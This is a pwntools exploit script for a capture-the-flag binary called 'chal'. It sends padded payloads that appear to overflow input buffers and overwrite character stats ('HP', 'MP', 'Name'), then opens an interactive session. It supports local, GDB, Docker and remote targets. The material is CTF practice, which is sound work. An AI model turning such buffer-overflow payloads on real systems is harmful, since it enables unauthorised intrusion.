#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chal')
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x1237 
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    chunk1 = b"Name: Mimic1"
    chunk2 = b"HP: 144"
    chunk3 = b"MP: 255"

    payload = b"A"*(28-len(chunk3)) + chunk3 + b"\xff\x00"
    io.sendafter(b"!", payload)

    payload = b"A"*13 + chunk2
    io.sendlineafter("!", payload)
  
    io.sendline(chunk1)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

